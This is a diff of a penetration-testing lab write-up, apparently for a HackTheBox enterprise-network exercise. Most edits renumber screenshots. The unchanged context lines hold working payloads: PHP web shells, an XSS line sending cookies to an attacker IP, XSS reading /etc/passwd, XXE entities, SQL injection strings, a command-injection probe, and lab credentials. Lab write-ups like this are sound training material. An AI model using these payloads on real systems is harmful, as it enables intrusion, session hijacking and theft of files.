@@ -329,7 +329,7 @@ PORT    STATE SERVICE  VERSION
 [SNIP]
 ```
 
-#### rpcbind (port 111)
+#### RPCBind (port 111)
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -496,7 +496,7 @@ HTTP/1.1 200 OK
 
 ![Burp Suite - Upload TRACK 1](./assets/screenshots/attacking_enterprise_networks_external_testing_10.png)
 
-```http
+```
 TRACK /upload.php HTTP/1.1
 Host: dev.inlanefreight.local
 
@@ -516,9 +516,9 @@ X-Custom-IP-Authorization: 127.0.0.1
 <?php system($_REQUEST["cmd"]); ?>
 ```
 
-![Burp Suite - Upload POST 1](./assets/screenshots/attacking_enterprise_networks_external_testing_14.png)
+![Burp Suite - Upload POST 1](./assets/screenshots/attacking_enterprise_networks_external_testing_13.png)
 
-![Burp Suite - Upload POST 2](./assets/screenshots/attacking_enterprise_networks_external_testing_15.png)
+![Burp Suite - Upload POST 2](./assets/screenshots/attacking_enterprise_networks_external_testing_14.png)
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -543,7 +543,7 @@ HTB{57c7f***************************} 📌
 
 #### `ir.inlanefreight.local`
 
-![Firefox - Ir Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_16.png)
+![Firefox - Ir Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_15.png)
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -669,9 +669,9 @@ bin:x:2:2:bin:/bin:/usr/sbin/nologin
  | Username: ilfreightwp, Password: password1
 ```
 
-![Firefox - WordPress Login Page](./assets/screenshots/attacking_enterprise_networks_external_testing_17.png)
+![Firefox - WordPress Login Page](./assets/screenshots/attacking_enterprise_networks_external_testing_16.png)
 
-![Firefox - WordPress Admin Theme Editor](./assets/screenshots/attacking_enterprise_networks_external_testing_18.png)
+![Firefox - WordPress Admin Theme Editor](./assets/screenshots/attacking_enterprise_networks_external_testing_17.png)
 
 ```php
 <?php system($_GET['cmd']); ?>
@@ -706,13 +706,13 @@ HTB{e7134abea7438e937b87608eab0d979c}
 
 #### `status.inlanefreight.local`
 
-![Firefox - Status Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_16.png)
+![Firefox - Status Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_18.png)
 
 ```sql
 '
 ```
 
-![Firefox - SQL Error](./assets/screenshots/attacking_enterprise_networks_external_testing_17.png)
+![Firefox - SQL Error](./assets/screenshots/attacking_enterprise_networks_external_testing_19.png)
 
 **SQL Injection**
 
@@ -720,7 +720,7 @@ HTB{e7134abea7438e937b87608eab0d979c}
 ' OR 1=1 -- -
 ```
 
-![Firefox - SQLi](./assets/screenshots/attacking_enterprise_networks_external_testing_18.png)
+![Firefox - SQLi](./assets/screenshots/attacking_enterprise_networks_external_testing_20.png)
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -805,7 +805,7 @@ Table: users
 
 #### `support.inlanefreight.local`
 
-![Firefox - Support Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_19.png)
+![Firefox - Support Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_21.png)
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -825,7 +825,7 @@ Host: support.inlanefreight.local
 [SNIP]
 ```
 
-![Burp Suite - Support GET Ticket XSS Attempt 1](./assets/screenshots/attacking_enterprise_networks_external_testing_20.png)
+![Burp Suite - Support GET Ticket XSS Attempt 1](./assets/screenshots/attacking_enterprise_networks_external_testing_22.png)
 
 ```
 [CONTINUE]
@@ -871,8 +871,6 @@ new Image().src='http://10.10.14.204:8000/index.php?c='+document.cookie
 "><script src=http://10.10.14.204:8000/script.js></script>
 ```
 
-![Burp Suite - Support GET Ticket XSS Attempt 2](./assets/screenshots/attacking_enterprise_networks_external_testing_21.png)
-
 ```
 [CONTINUE]
 
@@ -884,15 +882,15 @@ new Image().src='http://10.10.14.204:8000/index.php?c='+document.cookie
 [Mon Jun 30 04:07:31 2025] 10.129.71.63:47586 Closing
 ```
 
-![Firefox - Support Add New Cookie](./assets/screenshots/attacking_enterprise_networks_external_testing_22.png)
+![Firefox - Support Add New Cookie](./assets/screenshots/attacking_enterprise_networks_external_testing_23.png)
 
-![Firefox - Support Redirect to Dashboard](./assets/screenshots/attacking_enterprise_networks_external_testing_23.png)
+![Firefox - Support Redirect to Dashboard](./assets/screenshots/attacking_enterprise_networks_external_testing_24.png)
 
 #### `tracking.inlanefreight.local`
 
-![Firefox - Tracking Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_24.png)
+![Firefox - Tracking Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_25.png)
 
-![Burp Suite - Tracking POST Test](./assets/screenshots/attacking_enterprise_networks_external_testing_25.png)
+![Burp Suite - Tracking POST Test](./assets/screenshots/attacking_enterprise_networks_external_testing_26.png)
 
 **Server-Side Request Forgery (SSFR)**
 
@@ -910,35 +908,35 @@ x.send();
 <script>x=new+XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
 ```
 
-![Burp Suite - Tracking POST XSS Attempt](./assets/screenshots/attacking_enterprise_networks_external_testing_26.png)
+![Burp Suite - Tracking POST XSS Attempt](./assets/screenshots/attacking_enterprise_networks_external_testing_27.png)
 
-![Firefox - Tracking PDF XSS Result](./assets/screenshots/attacking_enterprise_networks_external_testing_27.png)
+![Firefox - Tracking PDF XSS Result](./assets/screenshots/attacking_enterprise_networks_external_testing_28.png)
 
 ```javascript
 <script>x=new+XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///flag.txt");x.send();</script>
 ```
 
-![Burp Suite - Tracking POST XSS Attempt Flag](./assets/screenshots/attacking_enterprise_networks_external_testing_28.png)
+![Burp Suite - Tracking POST XSS Attempt Flag](./assets/screenshots/attacking_enterprise_networks_external_testing_29.png)
 
-![Firefox - Tracking PDF XSS Result Flag](./assets/screenshots/attacking_enterprise_networks_external_testing_29.png)
+![Firefox - Tracking PDF XSS Result Flag](./assets/screenshots/attacking_enterprise_networks_external_testing_30.png)
 
 #### `vpn.inlanefreight.local`
 
-![Firefox - VPN Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_24.png)
+![Firefox - VPN Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_31.png)
 
 #### `gitlab.inlanefreight.local`
 
-![Firefox - GitLab Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_25.png)
+![Firefox - GitLab Subdomain Homepage](./assets/screenshots/attacking_enterprise_networks_external_testing_32.png)
 
-![Firefox - GitLab Register Page 1](./assets/screenshots/attacking_enterprise_networks_external_testing_26.png)
+![Firefox - GitLab Register Page 1](./assets/screenshots/attacking_enterprise_networks_external_testing_33.png)
 
-![Firefox - GitLab Register Page 2](./assets/screenshots/attacking_enterprise_networks_external_testing_27.png)
+![Firefox - GitLab Register Page 2](./assets/screenshots/attacking_enterprise_networks_external_testing_34.png)
 
-![Firefox - GitLab Flag](./assets/screenshots/attacking_enterprise_networks_external_testing_28.png)
+![Firefox - GitLab Flag](./assets/screenshots/attacking_enterprise_networks_external_testing_35.png)
 
 #### `shopdev2.inlanefreight.local`
 
-![Firefox - GitLab Subdomain Homepage 1](./assets/screenshots/attacking_enterprise_networks_external_testing_29.png)
+![Firefox - ShopDev2 Subdomain Homepage 1](./assets/screenshots/attacking_enterprise_networks_external_testing_36.png)
 
 ```yaml
 credentials:
@@ -947,9 +945,9 @@ credentials:
     host: shopdev2.inlanefreight.local
 ```
 
-![Firefox - GitLab Subdomain Homepage 2](./assets/screenshots/attacking_enterprise_networks_external_testing_30.png)
+![Firefox - ShopDev2 Subdomain Homepage 2](./assets/screenshots/attacking_enterprise_networks_external_testing_37.png)
 
-![Burp Suite - GitLab POST Checkout](./assets/screenshots/attacking_enterprise_networks_external_testing_31.png)
+![Burp Suite - ShopDev2 POST Checkout](./assets/screenshots/attacking_enterprise_networks_external_testing_38.png)
 
 **XML External Entity (XXE) Injection**
 
@@ -961,7 +959,7 @@ credentials:
 <root><subtotal>undefined</subtotal><userid>&xxe;</userid></root>
 ```
 
-![Burp Suite - GitLab POST Checkout XXE Attempt](./assets/screenshots/attacking_enterprise_networks_external_testing_32.png)
+![Burp Suite - ShopDev2 POST Checkout XXE Attempt](./assets/screenshots/attacking_enterprise_networks_external_testing_39.png)
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -971,15 +969,15 @@ credentials:
 <root><subtotal>undefined</subtotal><userid>&xxe;</userid></root>
 ```
 
-![Burp Suite - GitLab POST Checkout XXE Flag](./assets/screenshots/attacking_enterprise_networks_external_testing_33.png)
+![Burp Suite - ShopDev2 POST Checkout XXE Flag](./assets/screenshots/attacking_enterprise_networks_external_testing_40.png)
 
 #### `monitoring.inlanefreight.local`
 
-![Firefox - Monitoring Subdomain Homepage 1](./assets/screenshots/attacking_enterprise_networks_external_testing_34.png)
+![Firefox - Monitoring Subdomain Homepage 1](./assets/screenshots/attacking_enterprise_networks_external_testing_41.png)
 
 **Login Brute Forcing**
 
-![Burp Suite - Monitoring POST Login](./assets/screenshots/attacking_enterprise_networks_external_testing_35.png)
+![Burp Suite - Monitoring POST Login](./assets/screenshots/attacking_enterprise_networks_external_testing_42.png)
 
 ```
 ┌──(nabla㉿kali)-[~]
@@ -997,13 +995,13 @@ credentials:
     host: monitoring.inlanefreight.local
 ```
 
-![Firefox - Monitoring Subdomain Homepage 2](./assets/screenshots/attacking_enterprise_networks_external_testing_36.png)
+![Firefox - Monitoring Subdomain Homepage 2](./assets/screenshots/attacking_enterprise_networks_external_testing_43.png)
 
 **Command Injection**
 
-![Firefox - Monitoring Help Page Commands](./assets/screenshots/attacking_enterprise_networks_external_testing_37.png)
+![Firefox - Monitoring Help Page Commands](./assets/screenshots/attacking_enterprise_networks_external_testing_44.png)
 
-![Burp Suite - Monitoring GET Ping](./assets/screenshots/attacking_enterprise_networks_external_testing_38.png)
+![Burp Suite - Monitoring GET Ping](./assets/screenshots/attacking_enterprise_networks_external_testing_45.png)
 
 ```bash
 %0a'i'd
